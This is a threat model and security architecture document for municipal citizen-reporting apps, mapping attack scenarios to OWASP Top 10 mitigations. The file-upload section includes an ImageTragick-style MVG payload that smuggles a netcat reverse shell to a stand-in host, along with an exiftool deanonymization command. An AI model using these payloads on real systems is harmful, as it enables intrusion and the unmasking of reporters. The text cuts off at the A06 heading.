# c3 - threat model & security architecture (OWASP-mapped)

> Source: https://share.gemini.google/MAbE9JhmDHXq
> Harvested 2026-09-10 (project: Aici).

---

Threat Model and Engineering Security Architecture for Municipal Citizen Reporting Platforms

Municipal crowdsourcing platforms bridge two disparate trust zones: an untrusted, public-facing ingestion boundary accessible to anonymous or pseudonymous mobile and web clients, and a high-trust administrative boundary where municipal dispatchers, public works engineers, and emergency services triage civic incidents. The ingestion pipeline accepts untrusted unstructured binary objects, high-resolution spatial coordinates, and textual descriptions. Conversely, the internal dashboard interfaces directly with dispatch databases, municipal work-order workflows, and privileged administrative endpoints.

This architectural division creates an asymmetric threat surface. Malicious actors can leverage the open ingestion interface to compromise storage infrastructure, pivot into the municipal intranet, or disrupt civil operations through automated report fabrication. Simultaneously, inadequate privacy controls risk exposing whistleblower identities or citizens reporting sensitive municipal infractions. Establishing defense-in-depth requires anchoring technical mitigations to established cybersecurity standards, including the OWASP Top 10 (2021), the OWASP Application Security Verification Standard (ASVS v5.0), and National Institute of Standards and Technology (NIST) Special Publications.   

Targeted Threat Model and Technical Controls
1. Photo Metadata Leakage
Application Context and Exposure Profile

Citizens reporting illicit activities—such as illegal waste dumping, building code violations, or local corruption—rely on municipal systems to shield their identities from public exposure or retaliatory harm. When a mobile device captures an image, the operating system automatically populates the file with Exchangeable Image File Format (EXIF), Extensible Metadata Platform (XMP), and International Press Telecommunications Council (IPTC) metadata records. This metadata frequently contains precise GPS coordinates (including altitude and heading), exact timestamps, camera hardware serial numbers, and device identifiers. If the application stores and serves unmodified images across a public civic feed or within an unhardened dashboard, an adversary can extract these embedded artifacts to deanonymize the reporter, track their daily commute routes, determine their place of residence, and execute physical or digital harassment.   

Concrete Attack Scenario

A whistleblower submits a photograph documenting illegal industrial waste dumping behind a commercial facility. The citizen uses an anonymous reporting option to prevent retribution. However, the backend application saves the original image directly into an Amazon S3 storage bucket that feeds a public "Recent Issues" map widget. An adversary affiliated with the industrial facility scrapes the image using an automated extraction script leveraging exiftool:

Bash
exiftool -GPSLatitude -GPSLongitude -CreateDate -SerialNumber -Model report_photo.jpg


The script extracts sub-meter GPS coordinates (37°46'14.8"N 122°25'09.4"W), the device creation timestamp, and the camera sensor's unique serial number. Correlating this timestamp with the facility's perimeter surveillance footage and matching the camera serial number against photos previously shared on public social media accounts unmasks the citizen reporter, defeating the anonymity guarantees of the municipal platform.

Standard Technical Mitigations and Implementation Pitfalls

Sanitization cannot rely on client-side logic; compromised or malicious clients can bypass mobile application controls. Server-side processing must intercept and scrub every uploaded binary stream before it touches persistent storage or public distribution caches.   

The defense requires pixel-level re-encoding: the server decodes the raw raster pixel data from the untrusted binary into an isolated memory buffer and renders it onto a newly allocated canvas. This canvas is then saved to a standardized output format (e.g., JPEG or WebP) without carrying over metadata segments.   

A critical pitfall in image metadata sanitization relates to image rotation. Modern smartphone cameras do not physically rotate the sensor's pixel array when capturing portrait photos; instead, they record an orientation flag in the EXIF header (values 1 through 8). If an application naively strips EXIF metadata without first reading and applying this orientation tag to the pixel matrix, the re-encoded image will render rotated 90 or 180 degrees on the triage dashboard, degrading operational efficiency.   

When using Python's Pillow library, developers must execute PIL.ImageOps.exif_transpose() before stripping the metadata dictionaries:

Python
from PIL import Image, ImageOps

def sanitize_image(input_stream, output_stream):
    # Enforce decompression bounds to prevent denial of service
    Image.MAX_IMAGE_PIXELS = 16777216  # Maximum 16 Megapixels
    
    with Image.open(input_stream) as img:
        # Transpose pixel array according to EXIF Orientation, then drop EXIF
        transposed_img = ImageOps.exif_transpose(img)
        
        # Isolate pixel buffer into a new canvas to discard XMP, IPTC, and text chunks
        clean_canvas = Image.new("RGB", transposed_img.size)
        clean_canvas.paste(transposed_img)
        clean_canvas.save(output_stream, format="JPEG", quality=85, optimize=True)


This procedure normalizes the pixel layout, strips EXIF, XMP, and IPTC blocks, and neutralizes embedded metadata payloads. In Node.js environments using the sharp library (backed by libvips), metadata is stripped by default unless explicitly preserved, but orientation normalization requires calling .rotate() without arguments prior to output:   

JavaScript
const sharp = require('sharp');

async function processUpload(bufferStream) {
  return await sharp(bufferStream)
    .rotate() // Transposes image pixels based on EXIF Orientation before stripping
    .resize({ width: 2560, height: 2560, fit: 'inside', withoutEnlargement: true })
    .jpeg({ quality: 80, mozjpeg: true }) // Strips EXIF, XMP, and color profile comments
    .toBuffer();
}


Beyond standard EXIF, complex containers (such as PNG and TIFF) embed sensitive text chunks (tEXt, zTXt, iTXt), ICC color profiles containing text fields, and Adobe XMP blocks. Re-encoding the pixel data directly onto a fresh image canvas ensures that unexpected or hidden data fields are discarded.   

Relevant OWASP Top 10 (2021) Category

A01:2021 – Broken Access Control (specifically addressing the exposure of sensitive personal information and metadata leakage classified under CWE-200 and CWE-213).   

2. Malicious File Uploads
Application Context and Exposure Profile

The application exposes public file ingestion endpoints to receive image evidence from arbitrary network clients. Attackers frequently target native binary image decoders (such as ImageMagick, libpng, libjpeg-turbo, and libvips) hosted within backend environments. Accepting unvalidated binary payloads exposes the server infrastructure to remote code execution (RCE), host filesystem compromise, Cross-Site Scripting (XSS), and algorithmic resource exhaustion.   

Concrete Attack Scenarios

An attacker can target native image parsing libraries by exploiting delegate command injection vulnerabilities, a pattern exemplified by ImageMagick’s historic ImageTragick flaw (CVE-2016-3714). The attacker creates an exploit payload disguised as an image (e.g., upload.jpg) that actually contains Magick Vector Graphics (MVG) instructions:   

push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.internal/exploit.jpg";|netcat -e /bin/sh 10.0.0.1 4444")'
pop graphic-context

When an unhardened backend service processes this file to generate a thumbnail, the image library delegates the HTTPS URL request to a shell-based utility (such as wget or curl). Because shell metacharacters are insufficiently sanitized, the injected shell command executes, granting the adversary an interactive reverse shell inside the municipal backend network.   

In a secondary scenario, the attacker uploads an image that acts as a decompression bomb (pixel flood attack). By generating a small, highly compressed PNG file (e.g., 50 KB on disk) with header dimensions specifying 100,000 × 100,000 pixels, the attacker causes the server's graphics engine to allocate roughly 30 gigabytes of uncompressed bitmap memory during decoding. This triggers an Out-Of-Memory (OOM) kernel panic and crashes the ingestion service.   

In a third scenario, the attacker uploads an SVG image containing embedded JavaScript:

SVG

If the municipal triage dashboard renders this file inline or serves it with an executable XML MIME type, the script executes within the session context of the viewing municipal dispatcher, allowing the attacker to steal administrative session tokens.   

Finally, an attacker can craft a polyglot file, such as a GIF89a header prepended to PHP or Node.js code. If the application writes the file to an executable web root using a user-controlled filename, the attacker can execute arbitrary code on the server.   

Standard Technical Mitigations

Defending the ingestion pipeline requires a structured validation and processing strategy:   

Pipeline Stage	Security Control	Technical Standard and Implementation Details
Ingress Gate	Boundary Size and MIME Inspection	

Reject uploads over 10 MB at the API gateway or reverse proxy before hitting application runtimes.


Header Verification	Magic Byte / File Signature Validation	

Inspect leading file bytes using libmagic (JPEG: FF D8 FF, PNG: 89 50 4E 47 0D 0A 1A 0A, WebP: 52 49 46 46). Discard client-supplied Content-Type headers.


Format Exclusion	Vector and Document Format Prohibition	

Restrict uploads strictly to raster formats (JPEG, PNG, WebP). Reject SVG, PDF, and EPS files to eliminate embedded script execution vectors.


Dimension Bounds	Pre-Allocation Resource Limits	

Read image header dimensions before rasterization. Reject images exceeding 4096×4096 pixels or total pixel counts exceeding Image.MAX_IMAGE_PIXELS.


Decoder Isolation	Sandboxed Execution	

Execute image decoding and transformations within isolated, ephemeral containers (e.g., AWS Lambda, gVisor, or Docker with non-root execution, dropped capabilities, and read-only root filesystems).


Transformation	Bitwise Canonical Re-encoding	

Re-render valid image rasters to fresh output canvases in JPEG or WebP format, stripping out malicious code chunks and neutralizing polyglots.


Storage & Egress	Segregated Storage and Delivery	

Store processed images in dedicated cloud object storage buckets. Serve media via an isolated domain with Content-Disposition: attachment and X-Content-Type-Options: nosniff headers.

  

For systems running ImageMagick, configure /etc/ImageMagick-7/policy.xml to explicitly disable insecure coders and set strict resource limits:   

XML
<policymap>
  <policy domain="coder" rights="none" pattern="EPHEMERAL" />
  <policy domain="coder" rights="none" pattern="URL" />
  <policy domain="coder" rights="none" pattern="HTTPS" />
  <policy domain="coder" rights="none" pattern="HTTP" />
  <policy domain="coder" rights="none" pattern="FTP" />
  <policy domain="coder" rights="none" pattern="MVG" />
  <policy domain="coder" rights="none" pattern="MSL" />
  <policy domain="coder" rights="none" pattern="TEXT" />
  <policy domain="coder" rights="none" pattern="LABEL" />
  <policy domain="resource" name="width" value="4KP"/>
  <policy domain="resource" name="height" value="4KP"/>
  <policy domain="resource" name="memory" value="256MiB"/>
  <policy domain="resource" name="disk" value="1GiB"/>
</policymap>

Relevant OWASP Top 10 (2021) Category

A03:2021 – Injection and A06:2021 – Vulnerable and Outdated Components.   

3. Fake or Spoofed Reports
Application Context and Exposure Profile

Public crowdsourced applications face threats from coordinated disinformation campaigns, contractor sabotage (e.g., service providers fabricating tickets to win municipal repair contracts), and bot-driven denial-of-service against municipal labor forces. The integrity of an incident report depends on two factors: verifying that the report originates from an authentic client running on a genuine mobile device, and verifying that the provided geographic coordinates represent a physical condition observed at that location.   

Concrete Attack Scenario

A politically motivated group or a malicious actor scripts an automated botnet using residential proxies to flood the /api/v1/reports endpoint with thousands of programmatic submissions over 30 minutes. Each request pairs an AI-generated image of fallen electrical utility wires with forged GPS coordinates concentrated in a single municipal district. Municipal triage dispatchers are overwhelmed with critical emergency warnings, prompting real-world dispatches that waste city resources and delay responses to actual emergencies.

Standard Technical Mitigations

Protecting system integrity while preserving reporting accessibility requires a layered verification framework:

Hardware-backed mobile platform attestation verifies that submissions originate from legitimate, unmodified software running on certified hardware:   

Android Client Verification: Integrate the Google Play Integrity API. The client generates an attestation request containing a SHA-256 digest of the report payload (image hash, GPS coordinates, timestamp, and report text) within the request nonce. The backend verifies the returned integrity token with Google servers, checking that appRecognitionVerdict == 'PLAY_RECOGNIZED', deviceIntegrity == 'MEETS_DEVICE_INTEGRITY', and that the payload digest matches the submitted data.   

iOS Client Verification: Implement the Apple App Attest service using the DCAppAttestService interface. The device creates a cryptographic key pair inside the Secure Enclave. Apple's verification servers issue an attestation object that the backend validates against Apple's root certificates. Subsequent incident submissions include an assertion object signed by this enclave key, binding the report data and preventing automated replays or tampering.   

Web Client Defenses: For browser-based reporting where hardware attestation is unavailable, deploy invisible bot mitigation mechanisms (e.g., Cloudflare Turnstile or reCAPTCHA v3) that evaluate client telemetry and issue cryptographic Proof-of-Work (PoW) challenges when anomalous traffic is detected.   

Geospatial and telemetry validation helps filter anomalous coordinate data:

Geofencing: Use spatial queries in PostGIS (ST_Contains(municipality_boundary, ST_SetSRID(ST_Point(lng, lat), 4326))) to automatically drop or flag submissions located outside municipal boundaries.

Telemetry Cross-Referencing: Compare the client's reported GPS coordinates with the geographic location associated with its source IP autonomous system (AS). While cellular carrier networks can introduce regional variance, large geographic discrepancies (such as an international IP claiming an on-site pothole report) should be flagged for secondary review or trigger CAPTCHA step-up challenges.   

To mitigate image-flooding attacks, compute a perceptual hash (such as pHash or dHash) for each uploaded image to identify visual similarities across submissions:   

Hamming Distance=
i=0
∑
N−1
	​

(pHash
A
	​

[i]⊕pHash
B
	​

[i])

When an incoming image matches an existing report within a specific spatial cell (≤50 meters) and has a Hamming distance below a defined threshold (e.g., ≤10), the backend groups the submission as an upvote or corroborating signal for the existing incident rather than generating a new dispatch ticket.

Multi-dimensional rate limiting should be enforced across the API gateway using token-bucket or sliding-window algorithms. Separate limits should apply to authenticated citizen accounts (e.g., 10 reports/hour), client IP subnets (e.g., 20 reports/hour per /24 IPv4 block), and spatial geographic cells (e.g., capping submissions at 50 reports/hour within a 100m×100m Uber H3 spatial index cell).   

Relevant OWASP Top 10 (2021) Category

A04:2021 – Insecure Design and A08:2021 – Software and Data Integrity Failures.   

4. Broken Access Control
Application Context and Exposure Profile

The application manages distinct user classes: public citizens, field service contractors, municipal dispatchers, and system administrators. Because reports often contain a mix of public infrastructure issues, proprietary operational notes, and sensitive personal information (such as citizen names, phone numbers, home addresses, and unredacted photos), weak authorization models can lead to horizontal privilege escalation (citizens accessing other citizens' private reports) or vertical privilege escalation (citizens accessing triage endpoints).   

Concrete Attack Scenario

A citizen submits an incident report regarding residential street damage and receives an API tracking URL: https://city.gov/api/v1/reports/84920. An attacker observes the predictable, incremental integer identifier and creates a script to query IDs 84921 through 89000. Because the API endpoint only checks for a valid authenticated session without verifying record ownership, it returns the requested objects—an Insecure Direct Object Reference (IDOR) flaw. The attacker harvests thousands of reports containing sensitive personal details, resident complaints, and private operational data. In an additional vertical escalation attack, the adversary discovers that the municipal status update endpoint (PUT /api/v1/reports/84920/status) lacks role checks, enabling unprivileged users to unilaterally resolve or reassign service requests.   

Standard Technical Mitigations

Access control must be enforced centrally on the server, adhering to the Principle of Least Privilege and Deny-by-Default:   

Attribute-Based Access Control (ABAC) and Ownership Verification: Implement authorization logic at the service layer that validates ownership prior to returning record data. For citizen accounts, database queries must be bound to the caller's unique identity:   

SQL
SELECT id, category, description, status, photo_url 
FROM reports 
WHERE id = :report_id 
  AND (citizen_id = :current_user_id OR :user_role IN ('DISPATCHER', 'ADMIN'));


Cryptographically Random Identifiers: Replace predictable, sequential primary keys in public APIs with Version 4 UUIDs or 128-bit ULIDs. This prevents sequential resource enumeration, though programmatic authorization checks remain mandatory on all endpoints.

Segregation of Administrative Endpoints: Isolate municipal triage routes (/api/v1/admin/*, /api/v1/triage/*) from public API surfaces.   

Network Layer: Host the administrative dashboard on an isolated internal domain accessible only via enterprise VPN or Zero Trust Network Access (ZTNA) solutions.

Edge Routing: Configure the API gateway to reject external Internet traffic routed to administrative paths.   

Token Scoping: Verify that incoming authentication tokens contain specific administrative scopes (e.g., scope: reports:triage:write) before routing requests to backend controllers.

Relevant OWASP Top 10 (2021) Category

A01:2021 – Broken Access Control.   

5. Authentication and Sessions for the Municipal Dashboard
Application Context and Exposure Profile

Municipal staff manage civil resources, assign municipal workloads, and handle sensitive citizen complaints. Administrative dashboard accounts are high-value targets for credential stuffing, password spraying, phishing, and session hijacking attacks.   

Concrete Attack Scenario

A municipal triage worker reuses their internal network password on an external commercial website that suffers a credential breach. An attacker obtains the cleartext password from a published breach dump and executes an automated credential stuffing attack against the municipal management portal (https://admin.city.gov/login). Because the dashboard does not mandate multi-factor authentication or screen for compromised passwords, the attacker logs in successfully. The server issues a persistent session cookie lacking the Secure and HttpOnly attributes and with an indefinite session lifetime. Using these compromised credentials, the attacker accesses the dashboard, reassigns emergency work crews away from active gas leaks, and downloads the municipal reporting registry.   

Standard Technical Mitigations

Authentication and session management controls for municipal administrative interfaces should meet Authenticator Assurance Level 2 (AAL2) or Level 3 (AAL3) standards outlined in NIST Special Publication 800-63B:   

1. Credential Submission
   |-- Passphrase evaluation: Minimum 15 characters, Unicode and whitespace supported
   |-- Compromised password check: Screened via HaveIBeenPwned k-Anonymity API
   |-- Password entropy evaluation: Minimum score required via zxcvbn

2. Cryptographic Storage Verification
   |-- Hash evaluation: Argon2id (m=64MB, t=3, p=4) [RFC 9106] or bcrypt (cost factor >= 12)

3. Mandatory Multi-Factor Authentication (AAL2 / AAL3)
   |-- Primary: Hardware-backed FIDO2 / WebAuthn tokens (phishing-resistant CTAP2)
   |-- Fallback: RFC 6238 TOTP (HMAC-SHA256, 30-second window)
   |-- Excluded: Out-of-band delivery via SMS, voice calls, or cleartext email

4. Session Token Generation and Dispatch
   |-- Token generation: Minimum 128 bits of entropy via CSPRNG
   |-- Persistence: In-memory session store (Redis) with idle and absolute expiration tracking
   |-- Cookie dispatch: Set-Cookie: __Host-SessionId=<token>; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=28800

5. Lifecycle Invalidation
   |-- Idle timeout: Invalidation after 15 minutes of inactivity
   |-- Absolute timeout: Enforced session termination after 8 to 12 hours
   |-- Explicit termination: Complete token removal from server-side cache upon logout


Password policies must require a minimum length of 15 characters (or 8 characters if hardware-backed MFA is strictly enforced), disallow arbitrary character composition rules, and permit full Unicode input. Passwords must be screened against known breached credentials using services like the HaveIBeenPwned API, which leverages a k-Anonymity model. Password hashes must be stored using memory-hard derivation algorithms: Argon2id (configured per RFC 9106 with m=64 MiB, t=3 iterations, and p=4 parallelism) or bcrypt with a work factor ≥12.   

Multi-factor authentication must be mandatory for all municipal triage personnel. The primary factor should be phishing-resistant FIDO2/WebAuthn hardware tokens, which cryptographically bind the authentication assertion to the browser's origin, neutralizing reverse-proxy phishing attacks. TOTP (RFC 6238) may serve as a secondary fallback, while out-of-band mechanisms (SMS, voice, email) should be disallowed due to risks from SIM swapping and network interception.   

Session management must use tokens generated by a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG) providing at least 128 bits of entropy. Session cookies must use the __Host- prefix to prevent subdomain cookie injection:   

HTTP
Set-Cookie: __Host-SessionId=a9f7e834b2c1...; Secure; HttpOnly; SameSite=Strict; Path=/; Max-Age=28800


Enforce an idle session expiration of 15 minutes and an absolute maximum session lifetime of 8 to 12 hours. Centralize session states within an in-memory datastore (e.g., Redis) so that administrator sessions can be immediately revoked upon logout, password modification, or detected session anomalies.   

Relevant OWASP Top 10 (2021) Category

A07:2021 – Identification and Authentication Failures.   

6. Abuse and Content Moderation
Application Context and Exposure Profile

Public reporting platforms that accept unrestricted user-generated content risk being abused to host or distribute illegal or harmful material. This includes Child Sexual Abuse Material (CSAM), non-consensual explicit imagery, violent extremist media, and defamatory allegations directed at public employees or private citizens. Unregulated ingestion pipelines can expose municipal personnel to traumatic material, trigger civil defamation suits, and violate statutory content distribution regulations.   

Concrete Attack Scenario

A hostile actor submits a series of reports targeting a municipal building inspector. The submissions include sexually explicit imagery, violent threats, and defamatory statements accusing the inspector of criminal misconduct, accompanied by the inspector's home address. Because the platform renders incoming media and text directly in the triage queue, dispatchers are immediately exposed to traumatic content. Furthermore, if the report synchronizes automatically with an open civic tracking portal, the defamatory content becomes publicly visible, exposing the municipality to legal liability.

Standard Technical Mitigations

Deploy an automated quarantine and screening pipeline to isolate incoming content before it reaches human operators or public systems:   

All uploaded media must be marked with a QUARANTINE status upon ingestion. Quarantined assets are placed in private storage buckets and cannot be rendered inline within dashboard views or served through public endpoints.   

Automated content screening applies cryptographic and machine learning controls:

CSAM Detection: Hash incoming images and compare them against known illicit media databases using integrations with Microsoft PhotoDNA or the Project VIC framework. Matches should trigger an immediate system lock, record an immutable audit event, and generate an automated referral to law enforcement and child protection agencies.

Visual Content Screening: Quarantined images should be processed through computer vision models (such as AWS Rekognition, Google Cloud Vision SafeSearch, or open-source neural classifiers) to identify nudity, graphic violence, and hate symbols. Images exceeding defined confidence thresholds are flagged as RESTRICTED.

Text Moderation: Run report descriptions through Natural Language Processing (NLP) models and Named Entity Recognition (NER) algorithms to detect and redact phone numbers, national identification numbers, profanity, and targeted hate speech prior to database persistence.

To protect administrative staff from secondary trauma, the triage interface must automatically obscure flagged or unreviewed media using heavy Gaussian blurring or static placeholder tiles. Municipal workers must click an explicit "Reveal Media" confirmation prompt to view the underlying asset. Triage systems should also implement rotation limits and mandatory wellness intervals for personnel processing flagged queues.

Relevant OWASP Top 10 (2021) Category

A04:2021 – Insecure Design and A03:2021 – Injection.   

7. Data Protection in Transit and at Rest
Application Context and Exposure Profile

The application manages sensitive citizen data—including names, contact details, real-time location coordinates, and photographic records—transmitted across public mobile networks and persisted in cloud datastores. Inadequate cryptographic protections expose citizen communications to interception on insecure networks, risk massive data exposure if storage backups are improperly accessed, and prevent accountability if audit logging lacks tamper-resistance.   

Concrete Attack Scenario

A citizen connects to an unencrypted public Wi-Fi network to submit a report. The municipal API server supports legacy TLS 1.0 protocols and weak CBC ciphers. An attacker on the local network executes an ARP spoofing attack, intercepts the unencrypted traffic, and captures the user's session tokens, GPS coordinates, and personal contact information. Later, an unencrypted database snapshot is archived to an improperly secured cloud storage bucket. An external actor downloads the database archive, exposing thousands of historical citizen complaint files.   

Standard Technical Mitigations

Implement transit, rest, and audit controls aligned with NIST Special Publications 800-52 Rev. 2 and 800-92:   

Transport Layer Security must comply with NIST SP 800-52 Rev. 2 recommendations:   

Protocol Mandate: Require TLS 1.3 as the default protocol, permitting TLS 1.2 exclusively with FIPS-approved Authenticated Encryption with Associated Data (AEAD) cipher suites:   

TLS_AES_256_GCM_SHA384 (TLS 1.3)

TLS_CHACHA20_POLY1305_SHA256 (TLS 1.3)

TLS_AES_128_GCM_SHA256 (TLS 1.3)

ECDHE-ECDSA-AES128-GCM-SHA256 (TLS 1.2)

ECDHE-RSA-AES128-GCM-SHA256 (TLS 1.2)

Protocol Deprecation: Disable SSL 2.0, SSL 3.0, TLS 1.0, and TLS 1.1. Disable static RSA key exchanges and CBC-mode ciphers to prevent padding oracle exploits.   

HSTS Configuration: Enforce HTTP Strict Transport Security with long max-age settings:

HTTP
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload


Mobile Certificate Pinning: Implement public key pinning within the native mobile clients (using Android Network Security Configuration and iOS URLSession delegate pinning) to prevent interception via compromised Certificate Authorities.

Data at rest must be protected across storage layers:

Storage-Level Encryption: Encrypt all underlying relational database volumes, caches, and object storage buckets using AES-256 in Galois/Counter Mode (AES-256-GCM) with Customer-Managed Keys (CMKs) rotated through an enterprise Key Management Service (AWS KMS or HashiCorp Vault).   

Application-Layer Field-Level Encryption (FLE): Encrypt identifying citizen PII (e.g., reporter_name, phone_number, email_address) at the application layer using AES-256-GCM before writing to the database. Even if a raw database dump or replica is compromised, sensitive personal records remain encrypted.

Logging architectures must align with NIST SP 800-92 standards for computer security log management:   

Audit Scope: Record all administrative actions, authentication attempts, permission modifications, record reads, and status changes.   

PII Scrubbing: Implement an application-level redaction layer to strip credentials, session IDs, bearer tokens, and exact GPS coordinates from log messages prior to export.   

WORM Storage: Stream application logs to an append-only, Write-Once-Read-Many (WORM) storage system (e.g., Amazon S3 Object Lock in Compliance Mode) to prevent an adversary with root access from tampering with or deleting audit trails.   

Relevant OWASP Top 10 (2021) Category

A02:2021 – Cryptographic Failures and A09:2021 – Security Logging and Monitoring Failures.   

8. Denial of Service and Storage-Cost Abuse
Application Context and Exposure Profile

Public reporting endpoints that accept binary media uploads present an asymmetric resource-consumption target. An attacker can stream large volumes of data with minimal client effort, while the receiving municipal infrastructure must allocate web server worker threads, consume networking bandwidth, provision ephemeral memory buffers, and pay for long-term cloud object storage.   

Concrete Attack Scenario

An attacker targets the municipal API infrastructure using an automated script that opens hundreds of concurrent, slow-upload HTTP POST connections (a Slowloris/R-U-Dead-Yet style attack) containing multi-gigabyte payload declarations. The open requests exhaust available reverse proxy sockets and application worker threads, preventing legitimate citizens from reporting issues. Simultaneously, the attacker uploads thousands of randomly generated 15 MB image files. Over a weekend, the attacker dumps tens of terabytes of arbitrary data into the municipal object storage bucket, incurring thousands of dollars in unexpected cloud infrastructure fees and degrading system performance.   

Standard Technical Mitigations

Protecting infrastructure against volumetric storage abuse requires offloading binary media processing from core application servers and enforcing strict policies at the storage layer:   

Direct-to-storage presigned uploads decouple binary transfers from backend web applications:   

The client sends a metadata-only request (POST /api/v1/reports/upload-ticket) declaring the expected MIME type, file size, and payload hash.

The authenticated API service checks rate limits and issues a short-lived, presigned cloud upload URL (e.g., AWS S3 Presigned PUT URL) restricted to a 15-minute operational window.   

The presigned policy enforces strict cryptographic conditions: the Content-Type must match the declared image format, and the content-length-range condition restricts the payload size (e.g., between 1 KB and 10 MB). Payloads outside these boundaries are rejected at the storage gateway before consuming compute resources.   

The client uploads the binary payload directly to the storage bucket, bypassing backend application servers entirely.   

An asynchronous event trigger (e.g., S3 ObjectCreated event) sends the file to an isolated worker for validation, sanitization, and transformation. Files that fail validation are purged immediately.   

For fallback endpoints that handle uploads directly, configure reverse proxies (e.g., NGINX) to enforce strict connection and payload constraints:   

Nginx
client_max_body_size 10M;
client_body_timeout 10s;
client_header_timeout 10s;
keepalive_timeout 15s;
send_timeout 10s;
limit_conn addr_zone 10;
limit_req zone=upload_limit burst=5 nodelay;


Configure cloud storage lifecycle rules to control long-term data costs. Unlinked or orphaned files in the staging bucket are automatically purged after 24 hours. Validated images tied to resolved or duplicate reports are downscaled to efficient WebP thumbnails, and original files are transitioned to cold archive tiers (e.g., S3 Glacier Flexible Retrieval) after 90 days.

Relevant OWASP Top 10 (2021) Category

A04:2021 – Insecure Design and A05:2021 – Security Misconfiguration.   

OWASP Top 10 (2021) Complete Framework Applicability Analysis

The following section evaluates the citizen reporting system against each category of the OWASP Top 10 (2021) framework, detailing specific application risks and concrete engineering countermeasures.   

Category Identifier	Category Title	Applicability Level	System Risk Summary
A01:2021	Broken Access Control	Critical	

IDOR access to private citizen reports; unauthorized status manipulation; exposed triage endpoints.


A02:2021	Cryptographic Failures	High	

Eavesdropping on citizen location telemetry; unencrypted database archives; weak password hashing.


A03:2021	Injection	High	

SQL injection in triage filtering; shell command injection in image decoders; Stored XSS in dashboard.


A04:2021	Insecure Design	Critical	

Automated report spamming; GPS coordinate spoofing; storage resource exhaustion; unscreened harmful content.


A05:2021	Security Misconfiguration	High	

Publicly accessible cloud storage; permissive CORS rules; missing browser security headers; debug modes.


A06:2021	Vulnerable and Outdated Components	Critical	

Vulnerable native media decoders (ImageMagick, libpng); outdated web application framework libraries.


A07:2021	Identification and Authentication Failures	High	

Credential stuffing against municipal staff; missing MFA on triage portals; session fixation vulnerabilities.


A08:2021	Software and Data Integrity Failures	Medium	

Unverified client binaries; manipulated client-side location data; insecure background queue deserialization.


A09:2021	Security Logging and Monitoring Failures	Medium	

Undetected automated report flooding; missing audit trails for status updates and data access.


A10:2021	Server-Side Request Forgery (SSRF)	Medium	

Import-by-URL image ingestion exploits; unvalidated outbound municipal webhooks targeting internal cloud metadata.

  
A01:2021 – Broken Access Control
Applicability Assessment

Broken Access Control is the most severe vulnerability category facing the platform. The system enforces structural access boundaries: public citizens submit reports and should only access their own submissions; municipal triage dispatchers review and assign tickets; field contractors view assigned work orders; and administrators manage global system settings. Failing to enforce authorization at the data query layer allows horizontal privilege escalation (citizens accessing other citizens' records via IDOR) or vertical privilege escalation (unauthorized users manipulating report statuses or accessing administrative views).   

Implementable Engineering Mitigations

Authorization logic must be enforced declaratively on trusted server components rather than relying on client-side routing. Non-administrative database queries must be bound to the caller's unique identifier (e.g., WHERE id = :id AND reporter_id = :caller_id). Public API routes should expose random UUIDv4 identifiers rather than sequential database primary keys. Administrative routes (/api/v1/admin/*) must be isolated behind reverse-proxy access rules and require signed JWTs containing explicit administrative scopes (such as scope: reports:write).   

A02:2021 – Cryptographic Failures
Applicability Assessment

The application processes sensitive personal data, including citizen names, phone numbers, home addresses, and precise GPS location telemetry. Inadequate encryption in transit leaves mobile users vulnerable to eavesdropping and data manipulation on untrusted public Wi-Fi networks. Inadequate encryption at rest exposes database archives and cloud backups to exfiltration.   

Implementable Engineering Mitigations

Enforce TLS 1.3 across all endpoints, permitting TLS 1.2 exclusively with AEAD cipher suites (such as ECDHE-RSA-AES128-GCM-SHA256) per NIST SP 800-52 Rev. 2 guidelines. Disallow legacy SSL and TLS protocols, static RSA key exchanges, and CBC-mode ciphers. Send HSTS headers with long max-age settings (max-age=63072000; includeSubDomains; preload). Encrypt all underlying database storage and cloud object buckets using AES-256-GCM with customer-managed KMS keys. Encrypt sensitive citizen PII at the application layer before database writes so that data remains encrypted within backups and read-replicas.   

A03:2021 – Injection
Applicability Assessment

The platform accepts diverse user inputs, including unstructured text descriptions, structured geolocation coordinates, search parameters, and complex binary files. Injection risks include SQL injection in administrative ticket search interfaces, OS command injection via image parser delegates (such as ImageTragick), and Stored Cross-Site Scripting (XSS) if unsanitized report text or SVG files are rendered inside the administrative dashboard.   

Implementable Engineering Mitigations

Execute all database interactions using parameterized queries or hardened Object-Relational Mapping (ORM) frameworks, prohibiting dynamic SQL string construction. Disable dangerous external image delegates in ImageMagick's policy.xml configuration, and isolate image processing inside ephemeral, unprivileged container sandboxes. Disallow SVG uploads entirely to eliminate vector-based script execution. Render user descriptions within the triage dashboard using frontend frameworks that automatically perform contextual output encoding, and enforce a restrictive Content Security Policy (default-src 'self'; script-src 'self'; object-src 'none').   

A04:2021 – Insecure Design
Applicability Assessment

Insecure Design covers fundamental architectural and workflow flaws that cannot be resolved through code-level bug fixes alone. Crowdsourced platforms face inherent architectural challenges: unauthenticated report flooding, coordinate spoofing, backend resource exhaustion from large uploads, and exposure of municipal staff to illegal or explicit content.   

Implementable Engineering Mitigations

Deploy hardware-backed device attestation frameworks (Google Play Integrity API and Apple App Attest) to verify client authenticity and bind report payload digests to cryptographic nonces. Implement perceptual hashing (pHash) to automatically cluster and deduplicate reports submitted within the same spatial neighborhood. Use direct-to-storage presigned upload workflows with strict file size bounds to protect backend application nodes from bandwidth and memory exhaustion. Route all uploaded media through a quarantine workflow that screens for CSAM and adult content before rendering assets in internal triage dashboards.   

A05:2021 – Security Misconfiguration
Applicability Assessment

Cloud-hosted applications frequently suffer from security misconfigurations, such as overly permissive object storage bucket policies, unhardened Cross-Origin Resource Sharing (CORS) rules, enabled debugging interfaces, and default server configurations.   

Implementable Engineering Mitigations

Enable "Block Public Access" at the cloud account and storage bucket levels. Serve media assets exclusively through an isolated, authenticated Content Delivery Network (CDN) using signed URLs or Origin Access Control (OAC). Configure explicit, restrictive CORS headers that reject wildcard origins (*) on authenticated endpoints and only allow verified municipal domains. Set defensive HTTP response headers (X-Content-Type-Options: nosniff, X-Frame-Options: DENY, Referrer-Policy: strict-origin-when-cross-origin). Ensure development endpoints, debug flags, and verbose stack traces are disabled in production environments.   

A06:2021 – Vulnerable and Outdated Components
Applicability Assessment

